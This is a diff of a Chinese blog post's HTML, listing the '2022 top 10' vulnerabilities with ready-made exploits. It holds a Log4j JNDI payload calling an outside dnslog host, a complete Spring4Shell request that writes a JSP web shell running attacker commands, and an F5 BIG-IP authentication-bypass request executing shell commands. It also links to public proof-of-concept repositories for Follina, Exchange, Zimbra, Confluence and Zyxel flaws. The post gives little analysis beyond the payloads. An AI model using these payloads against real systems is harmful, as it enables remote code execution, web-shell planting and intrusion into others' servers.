@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言发现top10居然有好几个我没遇到过，这不得记录一下。 expCVE-2021-44228 log4j远程代码执行基础payload:${jndi:ldap:&#x2F;&#x2F;ky28eo.dnslog.cn} CVE-2022-30190看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-folli">
+    <meta name="description" content="前言 发现top10居然有好几个我没遇到过，这不得记录一下。 exp CVE-2021-44228 log4j远程代码执行 基础payload:${jndi:ldap:&#x2F;&#x2F;ky28eo.dnslog.cn} CVE-2022-30190 看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-follina CVE">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022 top 10漏洞">
 <meta property="og:url" content="https://blog.njcit.me/2023/01/28/poc_exp/2022_top10/index.html">
 <meta property="og:site_name" content="这里有一个网站">
-<meta property="og:description" content="前言发现top10居然有好几个我没遇到过，这不得记录一下。 expCVE-2021-44228 log4j远程代码执行基础payload:${jndi:ldap:&#x2F;&#x2F;ky28eo.dnslog.cn} CVE-2022-30190看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-folli">
+<meta property="og:description" content="前言 发现top10居然有好几个我没遇到过，这不得记录一下。 exp CVE-2021-44228 log4j远程代码执行 基础payload:${jndi:ldap:&#x2F;&#x2F;ky28eo.dnslog.cn} CVE-2022-30190 看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-follina CVE">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-01-28T02:14:22.000Z">
 <meta property="article:modified_time" content="2023-01-28T03:26:43.844Z">
@@ -107,7 +107,11 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-44228-log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2021-44228 log4j远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-30190"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2022-30190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-22965"><span class="toc-number">2.3.</span> <span class="toc-text">CVE-2022-22965</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-0609"><span class="toc-number">2.4.</span> <span class="toc-text">CVE-2022-0609</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#F5-BIGIP%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2022-1388"><span class="toc-number">2.5.</span> <span class="toc-text">F5 BIGIP认证绕过  CVE-2022-1388</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-11882"><span class="toc-number">2.6.</span> <span class="toc-text">CVE-2017-11882</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-41040-amp-amp-CVE-2022-41082"><span class="toc-number">2.7.</span> <span class="toc-text">CVE-2022-41040 &amp;&amp; CVE-2022-41082</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-27925-amp-amp-CVE-2022-41352"><span class="toc-number">2.8.</span> <span class="toc-text">CVE-2022-27925 &amp;&amp; CVE-2022-41352</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-26134"><span class="toc-number">2.9.</span> <span class="toc-text">CVE-2022-26134</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-30525"><span class="toc-number">2.10.</span> <span class="toc-text">CVE-2022-30525</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2021-44228-log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2021-44228
+log4j远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-30190"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2022-30190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-22965"><span class="toc-number">2.3.</span> <span class="toc-text">CVE-2022-22965</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-0609"><span class="toc-number">2.4.</span> <span class="toc-text">CVE-2022-0609</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#f5-bigip%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-cve-2022-1388"><span class="toc-number">2.5.</span> <span class="toc-text">F5 BIGIP认证绕过
+CVE-2022-1388</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2017-11882"><span class="toc-number">2.6.</span> <span class="toc-text">CVE-2017-11882</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-41040-cve-2022-41082"><span class="toc-number">2.7.</span> <span class="toc-text">CVE-2022-41040 &amp;&amp;
+CVE-2022-41082</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-27925-cve-2022-41352"><span class="toc-number">2.8.</span> <span class="toc-text">CVE-2022-27925 &amp;&amp;
+CVE-2022-41352</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-26134"><span class="toc-number">2.9.</span> <span class="toc-text">CVE-2022-26134</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-30525"><span class="toc-number">2.10.</span> <span class="toc-text">CVE-2022-30525</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -151,41 +155,54 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现top10居然有好几个我没遇到过，这不得记录一下。</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="CVE-2021-44228-log4j远程代码执行"><a href="#CVE-2021-44228-log4j远程代码执行" class="headerlink" title="CVE-2021-44228 log4j远程代码执行"></a>CVE-2021-44228 log4j远程代码执行</h2><p>基础payload:${jndi:ldap:&#x2F;&#x2F;ky28eo.dnslog.cn}</p>
-<h2 id="CVE-2022-30190"><a href="#CVE-2022-30190" class="headerlink" title="CVE-2022-30190"></a>CVE-2022-30190</h2><p>看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：<a target="_blank" rel="noopener" href="https://github.com/JohnHammond/msdt-follina">https://github.com/JohnHammond/msdt-follina</a></p>
-<h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p>spring的一个洞，限制比较多，poc如下：</p>
+    <h1 id="前言">前言</h1>
+<p>发现top10居然有好几个我没遇到过，这不得记录一下。</p>
+<h1 id="exp">exp</h1>
+<h2 id="cve-2021-44228-log4j远程代码执行">CVE-2021-44228
+log4j远程代码执行</h2>
+<p>基础payload:${jndi:ldap://ky28eo.dnslog.cn}</p>
+<h2 id="cve-2022-30190">CVE-2022-30190</h2>
+<p>看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：https://github.com/JohnHammond/msdt-follina</p>
+<h2 id="cve-2022-22965">CVE-2022-22965</h2>
+<p>spring的一个洞，限制比较多，poc如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host:x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="CVE-2022-0609"><a href="#CVE-2022-0609" class="headerlink" title="CVE-2022-0609"></a>CVE-2022-0609</h2><p>chrome漏洞，无poc，可以参考先知的分析文章</p>
-<h2 id="F5-BIGIP认证绕过-CVE-2022-1388"><a href="#F5-BIGIP认证绕过-CVE-2022-1388" class="headerlink" title="F5 BIGIP认证绕过  CVE-2022-1388"></a>F5 BIGIP认证绕过  CVE-2022-1388</h2><p>poc</p>
+<h2 id="cve-2022-0609">CVE-2022-0609</h2>
+<p>chrome漏洞，无poc，可以参考先知的分析文章</p>
+<h2 id="f5-bigip认证绕过-cve-2022-1388">F5 BIGIP认证绕过
+CVE-2022-1388</h2>
+<p>poc</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">X-F5-Auth-Token: a</span><br><span class="line">Connection: X-F5-Auth-Token</span><br><span class="line">Content-type: application/json</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;, &quot;utilCmdArgs&quot;: &quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h2><p>这个 Office RCE 漏洞非常经典，在当时是通杀所有 Office 版本的。poc：<a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p>
-<h2 id="CVE-2022-41040-amp-amp-CVE-2022-41082"><a href="#CVE-2022-41040-amp-amp-CVE-2022-41082" class="headerlink" title="CVE-2022-41040 &amp;&amp; CVE-2022-41082"></a>CVE-2022-41040 &amp;&amp; CVE-2022-41082</h2><p>CVE-2022-41040 Microsoft Exchange Server权限提升漏洞<br>CVE-2022-41082 Microsoft Exchange Server 远程执行代码漏洞  </p>
-<p>poc :<a target="_blank" rel="noopener" href="https://github.com/CronUp/Vulnerabilidades">https://github.com/CronUp/Vulnerabilidades</a></p>
-<h2 id="CVE-2022-27925-amp-amp-CVE-2022-41352"><a href="#CVE-2022-27925-amp-amp-CVE-2022-41352" class="headerlink" title="CVE-2022-27925 &amp;&amp; CVE-2022-41352"></a>CVE-2022-27925 &amp;&amp; CVE-2022-41352</h2><ol>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/vnhacker1337/CVE-2022-27925-PoC">https://github.com/vnhacker1337/CVE-2022-27925-PoC</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/Cr4ckC4t/cve-2022-41352-zimbra-rce">https://github.com/Cr4ckC4t/cve-2022-41352-zimbra-rce</a></p>
-</li>
+<h2 id="cve-2017-11882">CVE-2017-11882</h2>
+<p>这个 Office RCE 漏洞非常经典，在当时是通杀所有 Office
+版本的。poc：https://github.com/Ridter/CVE-2017-11882</p>
+<h2 id="cve-2022-41040-cve-2022-41082">CVE-2022-41040 &amp;&amp;
+CVE-2022-41082</h2>
+<p>CVE-2022-41040 Microsoft Exchange Server权限提升漏洞<br />
+CVE-2022-41082 Microsoft Exchange Server 远程执行代码漏洞</p>
+<p>poc :https://github.com/CronUp/Vulnerabilidades</p>
+<h2 id="cve-2022-27925-cve-2022-41352">CVE-2022-27925 &amp;&amp;
+CVE-2022-41352</h2>
+<ol type="1">
+<li><p>https://github.com/vnhacker1337/CVE-2022-27925-PoC</p></li>
+<li><p>https://github.com/Cr4ckC4t/cve-2022-41352-zimbra-rce</p></li>
 </ol>
-<h2 id="CVE-2022-26134"><a href="#CVE-2022-26134" class="headerlink" title="CVE-2022-26134"></a>CVE-2022-26134</h2><p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></p>
-<h2 id="CVE-2022-30525"><a href="#CVE-2022-30525" class="headerlink" title="CVE-2022-30525"></a>CVE-2022-30525</h2><p><a target="_blank" rel="noopener" href="https://github.com/Henry4E36/CVE-2022-30525">https://github.com/Henry4E36/CVE-2022-30525</a></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/loongten/p/15822195.html">https://www.cnblogs.com/loongten/p/15822195.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1915/">https://paper.seebug.org/1915/</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45894840/article/details/125200463">https://blog.csdn.net/qq_45894840/article/details/125200463</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/16329332.html">https://www.cnblogs.com/cute-puli/p/16329332.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11121">https://xz.aliyun.com/t/11121</a></li>
-<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11418">https://xz.aliyun.com/t/11418</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/10/office.html">https://www.sqlsec.com/2020/10/office.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dnoir/p/microsoft-exchange-server-cve202241040--cve2022410.html">https://www.cnblogs.com/dnoir/p/microsoft-exchange-server-cve202241040--cve2022410.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.yang99.top/index.php/archives/82/">https://www.yang99.top/index.php/archives/82/</a></li>
-<li><a target="_blank" rel="noopener" href="https://zgao.top/cve-2022-26134-confluence-ognl%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://zgao.top/cve-2022-26134-confluence-ognl%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li>
-<li><a target="_blank" rel="noopener" href="https://zgao.top/cve-2022-30525-zyxel-firewalls-ztp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://zgao.top/cve-2022-30525-zyxel-firewalls-ztp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li>
+<h2 id="cve-2022-26134">CVE-2022-26134</h2>
+<p>https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</p>
+<h2 id="cve-2022-30525">CVE-2022-30525</h2>
+<p>https://github.com/Henry4E36/CVE-2022-30525</p>
+<h1 id="参考文章">参考文章</h1>
+<ul>
+<li>https://www.cnblogs.com/loongten/p/15822195.html</li>
+<li>https://paper.seebug.org/1915/</li>
+<li>https://blog.csdn.net/qq_45894840/article/details/125200463</li>
+<li>https://www.cnblogs.com/cute-puli/p/16329332.html</li>
+<li>https://xz.aliyun.com/t/11121</li>
+<li>https://xz.aliyun.com/t/11418</li>
+<li>https://www.sqlsec.com/2020/10/office.html</li>
+<li>https://www.cnblogs.com/dnoir/p/microsoft-exchange-server-cve202241040--cve2022410.html</li>
+<li>https://www.yang99.top/index.php/archives/82/</li>
+<li>https://zgao.top/cve-2022-26134-confluence-ognl%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</li>
+<li>https://zgao.top/cve-2022-30525-zyxel-firewalls-ztp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</li>
 </ul>
 
   </div>
@@ -212,7 +229,11 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-44228-log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2021-44228 log4j远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-30190"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2022-30190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-22965"><span class="toc-number">2.3.</span> <span class="toc-text">CVE-2022-22965</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-0609"><span class="toc-number">2.4.</span> <span class="toc-text">CVE-2022-0609</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#F5-BIGIP%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2022-1388"><span class="toc-number">2.5.</span> <span class="toc-text">F5 BIGIP认证绕过  CVE-2022-1388</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-11882"><span class="toc-number">2.6.</span> <span class="toc-text">CVE-2017-11882</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-41040-amp-amp-CVE-2022-41082"><span class="toc-number">2.7.</span> <span class="toc-text">CVE-2022-41040 &amp;&amp; CVE-2022-41082</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-27925-amp-amp-CVE-2022-41352"><span class="toc-number">2.8.</span> <span class="toc-text">CVE-2022-27925 &amp;&amp; CVE-2022-41352</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-26134"><span class="toc-number">2.9.</span> <span class="toc-text">CVE-2022-26134</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-30525"><span class="toc-number">2.10.</span> <span class="toc-text">CVE-2022-30525</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2021-44228-log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2021-44228
+log4j远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-30190"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2022-30190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-22965"><span class="toc-number">2.3.</span> <span class="toc-text">CVE-2022-22965</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-0609"><span class="toc-number">2.4.</span> <span class="toc-text">CVE-2022-0609</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#f5-bigip%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-cve-2022-1388"><span class="toc-number">2.5.</span> <span class="toc-text">F5 BIGIP认证绕过
+CVE-2022-1388</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2017-11882"><span class="toc-number">2.6.</span> <span class="toc-text">CVE-2017-11882</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-41040-cve-2022-41082"><span class="toc-number">2.7.</span> <span class="toc-text">CVE-2022-41040 &amp;&amp;
+CVE-2022-41082</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-27925-cve-2022-41352"><span class="toc-number">2.8.</span> <span class="toc-text">CVE-2022-27925 &amp;&amp;
+CVE-2022-41352</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-26134"><span class="toc-number">2.9.</span> <span class="toc-text">CVE-2022-26134</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-30525"><span class="toc-number">2.10.</span> <span class="toc-text">CVE-2022-30525</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
